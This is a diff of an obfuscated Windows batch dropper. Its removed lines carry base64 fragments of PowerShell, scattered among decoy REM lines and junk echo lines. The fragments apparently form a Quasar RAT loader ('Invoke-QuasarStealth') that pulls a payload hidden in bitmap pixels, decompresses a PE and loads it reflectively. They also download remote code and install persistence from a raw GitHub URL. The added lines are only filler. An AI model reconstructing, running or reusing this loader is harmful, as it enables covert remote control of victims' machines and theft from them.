-sE%mQyzu%T "hxBIud=ZkIOdQKuBXylhelgaIl"
-sE%VXr%t "ZTsSamoCLY=RiaaYjWVFWrKGjousDVDtKXqeif"
-se%JOtT%T "NmWnxNyDqIUdoJE=CeSSZfImBJuxznndLLyXgktDIKtGR"
-REM hawk vertex vertex undergrowth binary shadow
-REM vertex mirage fathom twilight mirage pixel zenith
-Se%XCJJJ%t "FEWJytF=UQUwgRVJST1JdICQoJGV4Lk1lc3NhZ2UpIiAiUmVkIgpMb2ctU2lsZW50ICRleC5TdGFja1RyYWNlICJSZWQiCn0KW1N5c3RlbS5BcHBEb21haW5dOjpDdXJyZW50RG9tYWluLmFkZF9VbmhhbmRsZWRFeGNlcHRpb24oJG9uRXhjZXB0a"
-echo amtYbEN3a2xMOG95SzJxdXA5cUpXQ21zUGFGbnFEdDgwcHJ0b0drb0tXQUE= >nul 2>&1
-Se%afkZ%T "oRkfygsCt=bPxZgAbfHLtXBO"
-sE%dCSnC%t "DmTXvAfJ=rKSxTfwtIKzNUczhdpOtBEae"
-sE%TvCPj%t "SsUBqq=HVXidqSFFWYEoE"
-REM beacon lance phantom echo
-SE%aZjO%t "RqUujREzZw=uVptiBzGYvlUGS"
-REM strobe undergrowth pixel undergrowth delta kappa glimmer guard kiln ruby
-REM glimmer sword vision pixel echo
-REM vision mirage circle
-Se%rHyn%t "DcnfNKLUL=gZfpEWcrQuGPkBbuArsewLHSmCuFjd"
-se%JzHTa%T "rBwmsLzsTZtE=kAWrUDTmfKTtFtsSkyC"
-REM vertex fragment zenith core fathom shadow circle vision
-echo UUNkOGh2V0pvSzFSZFJXTVpJeUpkVDZxbFE4aFFCUTU2ZjJLWTBTdXc4Uw== >nul 2>&1
-Se%HWEd%T "esLPEdXValrVWB=aTDtzgkFgd"
-REM glimmer twilight zenith glimmer kiln twilight valley
-echo b0NGY0pGM2prVXJMdUFKbmRYQlpFVkFDSmpPV29uV3Zva0NxS2RCRjNQVUh2NW1DWlk2MUo0czN1ZjlocXcwag== >nul 2>&1
-echo Vk80QjNZU0FzMjMzd1gzZG9PUVZVaURIYjM1M1d2b0tjeXZ0Q2VDa2U0R25WbFIxeXZxZklkN0N6TjI2 >nul 2>&1
-echo WDk2d3VRa0Q2RzFGbmJMRjVJUWRCcDh2U2lMNDF4TkNOcDhFUWUzT0pqR3ho >nul 2>&1
-REM clearing shadow echo twilight
-se%QXp%T "pkzgIzwOgQe=ZW50ICJbK10gRXh0cmFjdGVkIFBheWxvYWQgTGVuZ3RoOiAkbGVuZ3RoIGJ5dGVzIgokZXh0cmFjdGVkID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5MaXN0W2J5dGVdCi"
-REM vertex mirage odyssey kappa kappa hawk echo vertex zenith
-se%AMJFw%t "nQtIWuotqAOnUKf=STLJgQZMRdXvyWqrPqUTWCBtzCODkULAKMY"
-echo Yk44SnprUWVuUUh3Y0xVQ3dFa3NSZHJFVzBtbmZoaE5qemhkSTZlakJkdXhGeVY= >nul 2>&1
-Se%knY%t "EsLbKA=bKvVvQlqoOkfhAEMoDwkVeiLquHFdr"
-REM lance cipher circle guard undergrowth echo lance fathom twilight guard
-Se%eFe%t "qLmmqwPWhjASQcF=dFlbYBvwWvUoyUXyuZVLmtpxNxJCXCANSRx"
-echo SVhYTHZMckh0a2o1dkFKN2ppdE9yRTd3Mmg2NXB3a3FCb1phT3BPOFA4WjAwckYxN2loSXBwNm9tUVVoY0t6Zm5iV1NEeGRrbHY= >nul 2>&1
-echo ZDJuVnkwSXJMOU1MMmpta0Z3akVidGxEcnRXUzZ1amJMOFV4aDRUU1Y1NWVNVkttamw0R0JWcQ== >nul 2>&1
-sE%zxR%T "XwStpGBiFBzXki=HSTUOgeKfjqZgdQJqlVvijEqIp"
-SE%MVUXE%t "ETnjtjqSU=QcyNwcVpMPkbKkktZd"
-echo ZktQelk4cmg4SWpYQnFQdGRmQ2s5OEZ4OEJqbGVYNHVGYWNsQUNHVkNXZGJyOTJGV1NkdA== >nul 2>&1
-se%aWP%T "HKkOfhJA=AZMoOPJxRuhyL"
-se%idrs%t "DxvoHFZaBJCO=zdGVtLlJlZmxlY3Rpb24uQmluZGluZ0ZsYWdzXSJQdWJsaWMsU3RhdGljIikgfCBXaGVyZS1PYmplY3Qgewokc3RyID0gJF8uVG9TdHJpbmcoKTsgKCRzdHJbMzddIC1lcSAnXScgLW9yICRzdHJbMzhdIC1lcSAnKScpI"
-REM mirage guard kiln ruby echo kappa guard
-sE%Kqbt%t "QgpmrcP=OQeShkKYaoIFIhpAWUkMIjpshUmyyqUZTY"
-Se%BuC%T "HhCwTLW=oiXASrHfwjIl"
-Se%Dby%t "ghXYviZuaE=hsBCsKxxFRuTkhmGCAbT"
-REM guard phantom odyssey odyssey core echo
-echo Vk50MXAwUXc3UUZYNmlMZ1JSZk1NRzV2akNZeFZXWm1VdnpoREpmcXFPbVFDZ0J4WjJSM1pJeHNzZm4= >nul 2>&1
-SE%FooXP%T "SJNbGaczZBPo=NgrJmnFyMRTrCQHARUshKGacpOyMHubLIQy"
-echo MnVGVnFzSk9wTEJXbWNick9KMDJtU3hSblVDc0RkYWNHTFhzSklwWnF1d25jMlBsSEc4ZFhuRGdaUFF4TWU5UTF3djU= >nul 2>&1
-echo dkQzMThZU1I5M08yYUlvSXM2SHZvbWNwUm45OFkwdUFtY2dDTGgxUlgzeWhuWFdnRm5KakFPUm9GeEJKTERTVjg= >nul 2>&1
-REM strobe undergrowth cipher glimmer
-se%JgXr%T "KFYMer=tVDRPmdesrqvINtFxOko"
-se%cfjRB%t "xQpeZvbNmU=ZRsCIlolcNW"
-REM delta vision vertex delta
-Se%QEHX%t "SMkVieoPaVoRHw=cGqbDzEeLTWEUcFoRUUjDbcTW"
-REM phantom fragment beacon hawk sword guard vertex glimmer vertex delta
-SE%OzQBk%t "yQMYLjiAYJUI=bIsfKiKvbkFksdTaCVAEqQeZEZ"
-echo VHZCZWpxSmVuZ1ZlaWpIWE1uZkRCMWhaR1FBQTNFNDhHZWcwWWQ3Nmk0WWQ4OUZxNHZVYTh1Zg== >nul 2>&1
-REM pixel hawk lance vertex core glimmer kiln cipher fragment
-echo NEZoM1l5WlVsNEQwbTBaSDNyekNUUlVGaDRZU3BBZnE3Qzk5ZmQ4Sw== >nul 2>&1
-echo SzVDT21uOFo3aGtZYzcyekVuemdDckcyMXc3Q0w5M3RXTUkwS0wxSzN2bHVGVXNxVFB0RVVtZFczVjFseEI= >nul 2>&1
-REM phantom glimmer fragment fathom beacon delta lance binary
-REM phantom binary echo undergrowth fragment twilight ruby lance vertex beacon
-REM binary pixel beacon zenith
-SE%CYXem%t "HovcHKoC=nHlJsKxXPsfuOeuIPceOxOe"
-echo a2U2cE5DVXpjZUtiVFhxRXZWbjFYUUNPR1Nwdkp3MXE2dFlWbzZGakc4N1FkVTBUa1lnek96VG9rUmxwQlNCamhnZnVoMWZ1 >nul 2>&1
-SE%Oiua%t "ZYLDgMGzXHXyj=XxNFNOvAdeQWisTOop"
-REM guard delta clearing strobe kappa mirage kappa
-REM clearing kappa zenith
-REM twilight fathom guard kiln binary kappa twilight phantom binary
-echo THhPN3lKaElOYVg5ZkF4TFk4Q282cGRyUmpzR210TnNocFpuNkt3TWtnQjFHelg2bkdS >nul 2>&1
-SE%WCbKL%t "qSIFgoobNP=ggBfqFbyusQeYcCwjv"
-REM cipher hawk cipher clearing guard phantom shadow hawk pixel
-se%dlme%t "uKGsKaEPkSuCDg=QWoZNyuAXElelmGPTbq"
-echo RDFHeXRwUFltVWNpMkkxOUJXcmVYakdNY0k3MTFNYmhYbG1YMUxqbUo= >nul 2>&1
-se%ROBN%t "NAPjgGFDfsw=WYgKCRleHRyYWN0ZWQuQ291bnQgLWdlICRsZW5ndGgpIHsgJGRvbmUgPSAkdHJ1ZTsgYnJlYWsgfQp9CmlmICgkZG9uZSkgeyBicmVhayB9Cn0KJHBhY2tlZCA9ICRleHRyYWN0ZWQuVG9BcnJheSgpOyAkYm1wLkRpc3B"
-REM kiln circle binary echo hawk hawk kappa fathom
-REM fragment delta fragment circle fragment
-REM zenith kappa strobe core sword strobe echo fathom delta odyssey
-sE%XJK%t "TDlcXalUhhjFW=dHJvGMDDUOTKxUnyjirKJCO"
-echo aFFDUDZ4dndKUzdmTEx2eEd0UmpVY1FBZk9oZnRjNWpMZEZYZVdodE04QjRGd0sxTGx5VVFrcGRyMHNwU0QyaUh3WUsycW41NmVrZ2dsa2U= >nul 2>&1
-echo bGo0NFV2ZXI3eEtFSGVzdHJ6a3BhZnZKdm9TSjYxYmdKaWZiZlZyMlNlY2VkSlEwcXlMbXBlc2pEendRYWl1bg== >nul 2>&1
-se%UpRH%t "NWcKTWcuWz=UukFFFhkMXbhsGdton"
-se%JFSG%T "oqcMCX=YwxuAKTprxNQKEnzUHnVKnkpR"
-REM core mirage odyssey guard mirage mirage ruby core glimmer
-se%gKet%t "JCYPxMzWAeAklFb=iDxAQHAfmQsgZUXObKztbQOlsdyY"
-REM hawk twilight circle undergrowth fragment zenith core
-SE%MDA%T "bxCjiKm=EoHgFEKoOcxYOldIxmPWwBvWuQWAvH"
-se%wrWMU%t "HycbmOjro=ifFeCkbvmaNLBtJlmuoaGuFBf"
-echo dHFIc0oyTndaM1lmNTZtZlhvNzlEYmM1bmltSW1hckFXUUVBQmNhU2tPaHdQMA== >nul 2>&1
-se%BpP%T "eLcBLU=fXJKMOFzYZFhrcDKnRiFjyLGXZcEsPbbn"
-se%mld%T "LSTHqdctb=QMGmDYSharbGzgiznoTTIstcLjJHm"
-se%nLi%T "PzKlaeLLS=3MuQ29weVRvKCRvdXRNcykKJHJhd1BFID0gJG91dE1zLlRvQXJyYXkoKQpMb2ctU2lsZW50ICJbK10gVW5jb21wcmVzc2VkIFNpemU6ICQoJHJhd1BFLkxlbmd0aCkgYnl0ZXMiCiRtc2NvcmxpYiA9IFtBcHBEb21haW5dOjpDdXJyZW"
-REM beacon echo delta mirage valley zenith shadow undergrowth glimmer fragment
-REM valley odyssey undergrowth
-REM fragment echo fragment circle valley shadow glimmer binary pixel echo
-REM twilight fragment pixel binary binary beacon phantom
-REM fathom cipher binary delta clearing
-Se%xmHxW%T "spsDaDkt=HWKFsqVzaerTg"
-se%uZRg%T "NGMCtw=giaQcaqszoXl"
-REM kappa kiln echo hawk mirage odyssey guard fragment shadow
-echo cWdENGM5R0hITDJvU0xsNFhmdmdNaG1HaTVNcnBHaGw5akZobUdob0EwTDNxSlBkUlJ2TjhSWA== >nul 2>&1
-REM pixel circle kappa beacon shadow ruby undergrowth strobe clearing clearing
-sE%kLqG%T "yFaflHHVpV=WwufJgZyxyiUZUuxTibUFOZ"
-se%eik%t "tViYZLGEjI=gCmBvlieAnvUzPlKhtZHlBsnzRWfPIfFs"
-se%qckM%t "BupVSVkd=ixpbQcMKxABmOAChnbairgMkCCXOWgdLf"
-REM valley binary circle clearing guard lance binary
-echo WnU5SE5vbTdaNmFOSlF5U3FYTXN4OWZ4WnE4WkxLbGRYaGFHZU9uTDVacU54Yg== >nul 2>&1
-echo NUdFQkVVZ3hUZDlxcTlsc2dOSmJwVlp5aDBCMDJqWkFPSlFmVzVXdUJoN0JOZEpOWVJ0NTRjVFluMk1oZkFpUA== >nul 2>&1
-echo QWFJYmxDcGtqMXB2YUFnZG5LQ216S3hHUFFoNGJaN2VVbHM5d1pJUU9pc0kzM1lNRHdtZUI= >nul 2>&1
-REM circle phantom phantom guard fragment twilight
-REM binary shadow twilight
-echo WGZ1UmgzWTdDZ01KWTNoWlloQ0N3VzVyc0dmT0N6NzJsNXZVaWV2Szk5QUZmbHpkTjVyTXpEdw== >nul 2>&1
-REM clearing cipher fragment pixel hawk
-REM sword sword fragment kiln odyssey
-echo cXM1WG01UzR0YjJ4Sm80RDdyeUdDZUJ4MEdRNXhFaExPMnZGTzdCdENnQjFpWkxMVjBQQWd0NExZTVF0RTR1YWVQaVY2ZlZucHJJS3pH >nul 2>&1
-SE%WQnB%t "tIYUQfdJFdYEF=aaZfNLwlpw"
-SE%GoP%T "tZgGTCA=ptEIaojLJlsRVYADXlwv"
-sE%ylYP%T "CCpPHN=JKhUqJyDhrdRRurFrLhfeWz"
-se%kFr%T "BziTHjmwiEB=wHPBANVotgPxj"
-REM glimmer twilight strobe guard glimmer kiln
-sE%YNdeU%t "ekCJuAfElI=FIBCuLiheZ"
-se%QAOTA%T "mCLmEe=rCUseNfYFeLE"
-REM mirage kiln cipher strobe kiln zenith
-Se%Skt%t "BDUDTZoqiHlDxkI=VVDNIZpjQbFyId"
-echo cGYybDNINm5JalBFcFRpOW84dFhORnp4M3BkVEtFZ1NPUUNJampUU2ZTb2xvM2Yxa282MkVEN3JGdjFISTZnNVFCbldSaDhLNkxON3pq >nul 2>&1
-REM echo strobe delta ruby zenith strobe
-REM phantom undergrowth mirage ruby mirage kiln fragment fragment undergrowth
-sE%pLI%t "lTUxDON=lbkqazoSfVytvU"
-REM phantom circle pixel ruby glimmer delta binary
-REM phantom binary guard
-SE%ykQTk%T "gavjQbUOwbvv=b24uTWVzc2FnZSkiIH0KfQp9Ckludm9rZS1RdWFzYXJTdGVhbHRoIC1Tb3VyY2UgJHRhcmdldA=="
-REM fathom guard kappa fragment strobe
-se%vfMYU%T "dnEvJHNGCPyI=W9uKQpmdW5jdGlvbiBJbnZva2UtUXVhc2FyU3RlYWx0aCB7CnBhcmFtIChbc3RyaW5nXSRTb3VyY2UpCnRyeSB7CiRkYXRhID0gJG51bGwKaWYgKCRTb3VyY2UgLWxpa2UgImh0dHAqIikgewpMb2ctU2lsZW50ICJ"
-se%NXa%T "gFIbpwtYTN=urgfVjvVWhBAfbECUUsNfganipbOpGy"
-REM fathom clearing pixel hawk echo
-se%jAWyT%t "JtvlFsbeYijcQ=IyNYHuhynKQgJRMcxemctUFzgLDoDFFeNp"
-Se%DbIio%T "ZgUzmfu=KJGwJNPGDIYBv"
-echo VHFDbno1WnpvdVdsWmY4R2hFS0xESHBmemlTWVJJUjl4a0Vnak1oMmRqYkw1bUY0dTcwRHZYR2RDZXZQaklIQ005ZlV4aHZ6 >nul 2>&1
-echo UjYwRHRDT09HT2xEZ3l0dXRLTlExNlNsUVJsdnc2TTV0b3MwR1pSZ1YwZ01vUDZ6ZVhka2ZYVWZ1QWk2Y1llT0cwTFRtZkRqNFNh >nul 2>&1
-echo OWt3VjY0NG5wUTFwaktTSnhWVll4OUppWmZ1MzBuc0hDM3hnYWtDZ01OZTJCVlY2clJWUDQ= >nul 2>&1
-se%DzdCt%t "AnKJlsS=vQcUUtKBDbdsx"
-SE%BNpU%t "grNexBUBY=pDDtrxagNDStLoBSAeIRyntPWofFXVVoK"
-REM pixel sword mirage sword valley
-SE%fhtzw%t "dXbQHo=SWQiuPPveBEhLD"
-se%SmExz%t "VremXfdBT=lOjWdrnRGZwvrFYgQ"
-Se%pVWe%t "HcOemUWbJxTi=RwLldpbkh0dHBSZXF1ZXN0LjUuMSIpCkh0dHAuT3BlbiAiR0VUIiwgdSwgRmFsc2UKSHR0cC5TZW5kCklmIEh0dHAuU3RhdHVzID0gMjAwIFRoZW4KdGVtcEZpbGUgPSBzaGVsbC5FeHBhbmRFbnZpcm9ubWVudFN0cmluZ3MoI"
-echo VWFUUWVkRG95RDZFV2NLd3ZiMGQ0U25VUVQ0WHFYUGZaaktQZnpXNGxWSU03VWtPZ1BoUXNNdHlVcHV1MkoyNE9hOQ== >nul 2>&1
-echo RkM0SGpiVXJvU0hab3FLbEdPWHpzUXVaTDR2WWpYaGJWVGpnR09EcGpNQlViMHMxNEdpSENZVkFtcGZpV2NzSk1hUg== >nul 2>&1
-echo a2lvUkpPWG41NE1pRUJiZm5PSTFYOEplbEhSd3JncjJJU1VzeUpRcmQwOU8xZjVjRHVsRFJEUW5QSFgzdjQ= >nul 2>&1
-se%xqv%t "EcCSdAys=IyFyFKvncMInUhgYGZCyuRtAaea"
-echo TUFGTWNJeERwbGtiYjZkVU42WVMxNVkzaDhvckhHQk9qbW9vSWtJS1ZoS2VLTU5vV0pWaEMwUHlnTw== >nul 2>&1
-REM shadow echo sword fragment phantom beacon odyssey echo core hawk
-echo MXdOTkZ6NmxwVWVOSElqek42aU50T2dIc1F6VzA4Y3dYQ3ZLTWdjeFB1RXlCZmhFenRBa1ZqT2xqcTBHcmZtNmM4M0JZ >nul 2>&1
-echo U1pXdVFxVmpHQzI2UGlEWWdCTXdkNWoyTHFVcEkxOTEwZU1UOHlOUzNlaWN1 >nul 2>&1
-sE%KkYGi%t "SrARWl=KFRlc3QtUGF0aCAkU291cmNlKSB7CkxvZy1TaWxlbnQgIlsqXSBMb2FkaW5nIHN0ZWdvIGZyb20gbG9jYWwgcGF0aDogJFNvdXJjZSIKJGRhdGEgPSBbU3lzdGVtLklPLkZpbGVdOjpSZWFkQWxsQnl0"
-Se%wWG%t "xnurOGQtQwGIxju=orolPBBPLNUBmnffFKa"
-Se%EuQI%T "JwnkMWi=FKtaIpCNZTKGSNFbcsGNpsLsXnjgIakZtD"
-echo bGVLNVJ1bEpBQUhEWThyV1FmbURYU01YY3BrMXcyTUNyQXVNZmJKeU9TVVU3NmU= >nul 2>&1
-REM guard lance odyssey kappa strobe guard echo strobe guard
-echo SDVUOERsRU5BRHJRM2dVZjRsOGtVRGlIaVh2RGVNbmsyc0cwcUp5YVF6bGxoRFhx >nul 2>&1
-sE%LxlrJ%t "yhLmCm=bKl0gRG93bmxvYWRpbmcgc3RlZ28gZnJvbTogJFNvdXJjZSIKJHdjID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudAokd2MuSGVhZGVycy5BZGQoIlVzZXItQWdlbnQiLCAi"
-sE%ZIoh%T "NHKqqUcbVqr=mfdtIWTMEinfoaVtNMJ"
-echo VTVsRUtQOHh5NGFPZkp6b25HclJCNUszN1VUcVRBTElKSnNwVHFLYW9lQ09RMGhBbk1xT1RDb0xq >nul 2>&1
-echo MUVsRGROQktpbXVVelhYd2NIbTlybmJxa3NsV2hydXR0akNRckdNVUlDZXZSTTI4dUF3Smt1cHVFdGNRUko3Q3BVRExiWmphN1hy >nul 2>&1
-REM valley fathom mirage echo core phantom fathom
-REM kappa circle binary
-REM vision kiln sword binary
-SE%gdmF%T "CKVGtIF=ypiOcRgbCzCHbxYHZJlCyLDADdOib"
-SE%wQBJs%t "VjBJRqjShs=TlEGshcnIRDhplCxQGHddmHNev"
-sE%cEd%T "etDzQx=hKknmBJxVV"
-Se%hxmJz%t "imdNsuebuOi=IGHZMJSsSYfuraxbJTV"
-echo ZDlwOFppUWFrWk9LcTJrRnFPeGtyUkp4d2dsRzdCTkhPcVhpSnFsTjhvY1Y= >nul 2>&1
-REM guard phantom echo binary zenith guard mirage binary
-Se%aVEq%t "ikXmWCG=geWV0LiIgIlllbGxvdyIKfSBlbHNlIHsKTG9nLVNpbGVudCAiWypdIFRyaWdnZXJpbmcgcGVyc2lzdGVuY2UgaW5zdGFsbGF0aW9uIGZvcjogJFBFUlNJU1RFTkNFX1VSTCIKSW5zdGFsbC1QZXJzaXN0ZW5jZSAtU3RhZ2VyVXJsICRQRV"
-sE%FIuY%T "tormoLMtt=ppwYiwgGhTrvpzFUhnikKusmhfrHXQ"
-sE%uubEU%t "rEkjEOiZ=wJEEBowMjPYcEGRi"
-SE%CvQN%T "OmUgIZ=VvjKHVvMwBVSXBET"
-echo a0xVMk1DQ0JMNHBnR0RBVTVISUYySUpxdUVldEtMMFlMU0pVQVpob0J1YjVOTXA0NkVqS0ZUekk= >nul 2>&1
-echo ak9Qem44SGNRMjVCSkxkTkREWjVPbHhvN3R2QW1aMHk4ZEZPWHpsUVRsdHBSOGNqSTBhMHVLMW4zQzBiS0lxbVJtQnBCbUJhN3M= >nul 2>&1
-REM core lance phantom guard circle fathom cipher shadow binary
-echo b2g0TGpob2VSTTY1cjQ4RUJUdTN4TmRFWWV6dGtKb1BxdmJVem9ScVFm >nul 2>&1
-se%dSDvF%T "akQAhYlqCcKVS=MyRnWYFslMvB"
-Se%djs%t "ufkXBZFit=puhwrzfotRfZCQuiedhkADDnwHFH"
-SE%Seid%t "kVXaSy=CIJfgyZnuuAwXqtVATbgnZsEyTtBSu"
-REM zenith twilight strobe guard circle fathom echo phantom
-REM vision delta lance
-REM echo cipher lance valley hawk vertex
-echo MURlelJMS3ZJczFpZVN4aWJHVU0wYWVSTXd4eUJWZDlLQ0dsb1B5a0g5OEw= >nul 2>&1
-se%ReVV%t "hLXbbHEtnwxM=oiWauPDfvZHIomRskByca"
-echo bktvS1docnNDSlV0UGtrdGdwUG9yNFBqalVvNmhmdGpyR3hjaVE4azUxQnJ2UlpzZGFTb01HYmg= >nul 2>&1
-sE%dkaMN%T "oZCrBlJvPXjhS=oJxnvsgPUZFvKsVmwI"
-se%qULd%t "orEWFa=ixjwtOdRmDniWFvNfPGrxf"
-REM fragment lance odyssey odyssey clearing beacon
-REM fathom kiln delta binary zenith binary kappa
-SE%Ytna%t "GqOlqIVI=qTXcmZqfYoQRyBc"
-Se%TDJO%t "biYVcBDkenQ=ZXNzYWdlKSIgIlllbGxvdyIKfQp9CiRQRVJTSVNURU5DRV9VUkwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3doYXRldmFib3kvY3VybHljYXJuaXZhbC9tYWluL3VzZX"
-echo bmFzMHlNdTZmQVpxTGVGU1Y2bXgxYVB0WUpLQmdVR3Qyd2NKUmN0ZEE= >nul 2>&1
-REM sword hawk vertex
-echo ZlFhTloxdHcwMnJlYVB6VnBUeENJbHA2R1RHeGFzTG11cWt6MG1TRWN3SmlJNHZ0V0R3U0JCczFIeGhFeHN3NHUyemlLd0tkd0Fz >nul 2>&1
-se%CCMT%T "rgLmCOjx=ZMvUOiQBETOLbnYWiF"
-SE%bhky%T "gOGRHWQOSnpzt=FXxlhkJUfB"
-SE%xmUJH%T "afXgmJUTotX=zeWJqJizGHbrsmKAqhSuV"
-Se%ghdcM%T "kyWNqlVYdd=uUZLfVOqwEePcxObjDsuCVKOpLUT"
-Se%Yhr%t "PvTQmlTZoz=EyJaClhCNSnqvumbkWftxTVcVfGLjLxyc"
-Se%xsB%T "TFBgyWQqQviv=tHHsZdqCDPExBR"
-echo cW5TS2lwVEl1NzdmRlIzUzFlNGJhMFFhckU1ZnlYanlvdlU0bkE3Z05JalR6WnFEVUFZNFVFODZUOHZjdVp5ZXd2dzE= >nul 2>&1
-REM kappa lance fragment guard lance shadow phantom valley shadow
-REM hawk binary beacon strobe guard lance delta kiln ruby valley
-SE%AHSJ%t "hAjXhWhSyhtijG=nwwqThnVwTMsbOlErL"
-se%Skc%t "EVxVBUkRaBymQXi=SMKuZtQVhMPOBCVWNwIOMnQwX"
-Se%idVBn%t "faipRzIGh=COZGetvVdtKdzSfmlwNpR"
-SE%iaDt%T "kVDnchJUeSTO=iIjKLnArqprHYtnbKZrupzsMVycUESeMpF"
-echo QlJjZnV2ZGdZQ1I3Qk9sWjVLaWh4a1p1YXdJTEtJVW85ZVlUVGwzZVc3T3ZLNkRLSWNyZnZkZkV1Sw== >nul 2>&1
-sE%haMKj%T "bjHvXbzbtV=oBxJGXlkentIBvPYFVNUULCNraLm"
-SE%toz%T "GqKnhg=nJvcjogJCgkXy5FeGNlcHRpb24uTWVzc2FnZSkiICJXaGl0ZSIgJHRydWUKaWYgKCRfLkV4Y2VwdGlvbi5Jbm5lckV4Y2VwdGlvbikgeyBMb2ctU2lsZW50ICJJbm5lcjogJCgkXy5FeGNlcHRpb24uSW5uZXJFeGNlcHRp"
-se%qxaUd%t "SezSvKID=avoKADCWQKnClb"
-REM strobe glimmer sword hawk fathom vision fathom
-REM delta binary pixel phantom undergrowth undergrowth kappa mirage delta vision
-REM phantom glimmer twilight kappa binary sword phantom binary valley vision
-se%WoB%T "cQJheazW=TFZsheJCpyTTvAwwwFPbwEFIRZUPRh"
-Se%BfkDn%t "cISUnH=4IC1lcSAxKSkgeyBjb250aW51ZSB9CiRweCA9ICRibXAuR2V0UGl4ZWwoJHgsICR5KQokZXh0cmFjdGVkLkFkZCgkcHguUik7IGlmICgkZXh0cmFjdGVkLkNvdW50IC1nZSAkbGVuZ3RoKSB7ICRkb25lID0"
-REM kiln beacon binary lance odyssey
-REM vision fathom lance valley fathom odyssey ruby circle vertex cipher
-REM core ruby circle
-SE%jIt%t "vvTuAeoTI=jsmpxtGtyDhIYncCCDIlzBntQObjfgkeVG"
-echo VERBMlRmZG1IbFJZMDFFUGNhOEVZa1hqb0hLendnVEdXY1dkNm5UZkFwT2JJSFE= >nul 2>&1
-Se%YrB%t "xLzzSo=yyjwspCVleNSbkQXOcrNrSMdkBJeDdkp"
-sE%kcZu%T "BZfareQcMTULvlg=xjgCLGteqFhNapIO"
-sE%doI%T "oCXpNWP=gzvVzUBLYfLLXJhzXJMuFvKjrY"
-REM vertex beacon delta hawk
-REM circle twilight cipher vision sword sword cipher undergrowth guard
-Se%CRf%t "GTelxvAKSYU=dGVycygpLkNvdW50IC1lcSAwKSB7CiRlbnRyeS5JbnZva2UoJG51bGwsICRudWxsKQp9IGVsc2Ugewokc3RhcnIgPSBbc3RyaW5nW11dQCgpCiRlbnRyeS5JbnZva2UoJG51bGwsIEAoLCRzdGFycikpCn0KTG9nLVNpbGVudCAiWytdI"
-REM fragment mirage kiln pixel
-REM vision delta twilight clearing valley ruby clearing
-REM kiln kiln vertex vision sword
-echo dGVKd0pqZXVzdUpWYlQ5SzdqeWlpQXYxakVyd2xXWjRJV0lxcFBLRGNsS2xkS2xEaDNLNDJUb09iMUU4RE5zYk84dnM4cGRzNWtSTWJCRnA= >nul 2>&1
-REM pixel sword circle
-REM binary mirage twilight glimmer clearing
-REM undergrowth vertex delta strobe beacon binary guard vertex circle circle
-sE%UsgNE%t "JNtgvW=hnSUSNkhVkHmUuayATmvZCGgB"
-REM zenith vertex twilight hawk shadow sword vertex phantom beacon strobe
-REM glimmer kiln twilight hawk hawk
-sE%aLcPE%t "RfoUUj=XoONtAmRJtqEQcyKUvHbjcUttlghw"
-REM kiln circle binary mirage circle
-se%Lce%T "JctPAGx=vxGhdDInOyL"
-echo UGRPa0JmNkFGeEZqQUdjbEN5VE1kaUd1TXdWUHY5bEdRbHowTkZSVEV3R1Z6QVRXb1pjdlhrS0ZlQU5GVFZxQ1RTbjZYSFpI >nul 2>&1
-REM guard vision shadow twilight fathom delta
-sE%Dgzx%T "khTUhqAXG=aQszEKoXrFtcGxfolzBohUNlBMi"
-sE%iHAO%T "CHcAraffhQTK=CjusZeauoP"
-REM phantom core sword core
-REM valley valley fathom undergrowth echo binary beacon undergrowth sword
-se%ysppW%t "hBERRDfc=tizuSyLkYeQJUAqzVhwGUHyYVWZdpROMW"
-echo bWhWTEhORTJMVjYxcDVuekxsMVYzS2xMZjlUdmV5Z05lSEU3NllCdWNLZUI4YjM1QU8= >nul 2>&1
-REM beacon fragment ruby glimmer twilight valley glimmer
-se%HiJ%t "cBPMHc=FaMbHnamGtMrVWMNyCyhASwxWVBGrfd"
-echo WVRxbTlKRDdhUWswTW9POVFnMGY0S1h2bWQ1cms4Q0pjV1RESjBwc0wybVlnczdkQWNadEd5VkYyV3hpVlh5T1Bwdlp6 >nul 2>&1
-REM echo vision guard hawk sword beacon circle strobe
-REM core undergrowth ruby glimmer vision guard circle hawk
-se%ssp%T "qlLVPPnclayAnO=cMcLUPkIhrgHVzHbBeJmxDLznewiTa"
-SE%xQe%T "JqADsiDQN=fUlLxohLGRUcny"
-REM pixel echo vertex valley glimmer kiln circle ruby
-SE%Mww%t "MAMVzIVoH=SFaRJZptRrVaXkJeG"
-REM kappa delta vision
-REM fathom lance kappa kappa
-sE%NiF%t "VfVNKUkNYN=FAEtGfssXpVIkDIqqnSDDBFoRE"
-REM core guard phantom
-sE%hWyTU%t "CsJmJh=zgOGJtYBzVptXdJPhG"
-REM vision beacon glimmer
-REM vision delta echo
-se%RJDJt%t "zzjpZpQEMbwJ=UTNwPPCzRepkYRTZwuAOFAsav"
-echo cUtJb0pPM3RxZ2hseFlpelhxQ3hjbDZsVUNKT3ptdzRIZDRXTDl4Y1EyZ0hXbm1r >nul 2>&1
-REM binary undergrowth hawk kappa glimmer vertex shadow zenith
-SE%EmNS%t "VLKkAdA=WZPIEoYVzvTmnuUraHghIEirfbq"
-Se%mKvA%t "witSYCjFJpbwd=yialuEZqJsSLSgu"
-REM twilight cipher undergrowth
+se%RdgU%t "tdRLEj=BqSkSvpPBbQHUFJ"
+REM odyssey beacon kiln vision ruby lance odyssey
+echo V1FGZ1BvcVYyS1VmTzFDMjh6QmZFR0d6UzFjM3VSbnN1MEI2ZFIxWU5XQUVqZUF1Y3Z0Nm0xRVROQWFZVzdxTnM0YmdCcQ== >nul 2>&1
+Se%Rtl%t "WLLPGYmTsjgww=uwRNMrJBIOfzvEjZREIMCfwxGlurUrO"
+REM ruby echo beacon clearing strobe zenith
+echo VkxWdjlZMk1KNW1kNmtLUGxZQ3J3dHNFSjNzMUNHZks0Sm11OFpKNlp0azlSaW1LMThxbmc1UG82YmNWcXVYMjhYQXFPTHdmbEdGUWJs >nul 2>&1
+REM vision delta lance circle lance undergrowth
+SE%iJUJa%t "RLYwAyxhOssVuz=qoxdcIwKUJPfQIQQkuNdGvmwJNEitpr"
+REM ruby core phantom phantom beacon core hawk vision guard ruby
+REM beacon binary hawk odyssey
+REM circle guard lance twilight clearing core
+REM delta kiln shadow undergrowth valley echo circle fathom
+REM fathom beacon beacon strobe vision strobe delta
+REM twilight circle glimmer fragment kappa clearing kiln kappa glimmer
